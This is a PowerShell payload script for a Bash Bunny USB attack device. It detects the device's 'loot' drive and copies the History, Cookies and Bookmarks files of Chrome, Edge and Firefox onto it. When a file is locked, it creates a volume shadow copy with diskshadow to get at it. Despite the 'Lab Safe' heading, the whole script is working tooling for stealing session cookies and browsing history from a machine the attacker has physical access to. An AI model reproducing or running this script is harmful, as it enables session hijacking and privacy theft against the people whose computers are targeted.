#############################################
#  Browser Artifact Collector (Lab Safe)
#  Saves directly to Bash Bunny loot folder
#############################################

# --- Detect Bash Bunny drive ---
$usbDrive = Get-WmiObject Win32_LogicalDisk |
    Where-Object {
        $_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
    } |
    Select-Object -ExpandProperty DeviceID -First 1

if (-not $usbDrive) {
    Write-Output "[-] ERROR: Bash Bunny loot drive not found."
    exit
}

Write-Output "[+] Bash Bunny detected on drive $usbDrive"

# Normalized loot path
$loot = Join-Path $usbDrive "loot\browser_artifacts"

# Ensure loot folder exists
New-Item -ItemType Directory -Force -Path $loot | Out-Null
Write-Output "[+] Loot folder: $loot"


#############################################
#   Function: Safe Copy with Shadow Fallback
#############################################

function Copy-Safe {
    param(
        [string]$source,
        [string]$dest
    )

    if (!(Test-Path $source)) {
        return
    }

    try {
        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
        Write-Output "[+] Copied: $source"
        return
    }
    catch {
        Write-Output "[-] Normal copy failed for $source"
    }

    # --- Shadow Copy Fallback ---
    Write-Output "[*] Attempting shadow copy..."

    $shadowScript = @"
SET CONTEXT CLIENT ACCESSIBLE
BEGIN BACKUP
ADD VOLUME C: ALIAS vol1
CREATE
END BACKUP
"@

    $shadowFile = "$env:TEMP\shadow.txt"
    $shadowScript | Out-File $shadowFile -Encoding ASCII

    diskshadow /s $shadowFile | Out-Null

    # Locate created shadow copy
    $shadow = (vssadmin list shadows | Select-String "Shadow Copy Volume:").Line
    if ($shadow -match "Shadow Copy Volume:\s+(.*)$") {
        $shadowPath = $matches[1].Trim()
        $shadowSource = $source.Replace("C:", $shadowPath)

        try {
            Copy-Item $shadowSource $dest -Force
            Write-Output "[+] Shadow copy successful for $source"
        }
        catch {
            Write-Output "[-] Shadow copy failed for $source"
        }
    }
}


#############################################
#          Chrome Collection
#############################################

$chromeUser = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeDest = Join-Path $loot "Chrome"
New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null

$chromeTargets = @(
    "Default\History",
    "Default\Cookies",
    "Default\Bookmarks"
)

foreach ($item in $chromeTargets) {
    $path = Join-Path $chromeUser $item
    Copy-Safe -source $path -dest $chromeDest
}


#############################################
#               Edge Collection
#############################################

$edgeUser = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeDest = Join-Path $loot "Edge"
New-Item -ItemType Directory -Force -Path $edgeDest | Out-Null

$edgeTargets = @(
    "Default\History",
    "Default\Cookies",
    "Default\Bookmarks"
)

foreach ($item in $edgeTargets) {
    $path = Join-Path $edgeUser $item
    Copy-Safe -source $path -dest $edgeDest
}


#############################################
#             Firefox Collection
#############################################

$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
$ffDest = Join-Path $loot "Firefox"

if (Test-Path $ffBase) {
    New-Item -ItemType Directory -Force -Path $ffDest | Out-Null

    foreach ($profile in Get-ChildItem $ffBase -Directory) {

        $pDest = Join-Path $ffDest $profile.Name
        New-Item -ItemType Directory -Force -Path $pDest | Out-Null

        $files = @("places.sqlite", "cookies.sqlite")

        foreach ($f in $files) {
            $full = Join-Path $profile.FullName $f
            Copy-Safe -source $full -dest $pDest
        }
    }
}


#############################################
#                Done
#############################################

Write-Output "[+] Browser artifact collection complete."
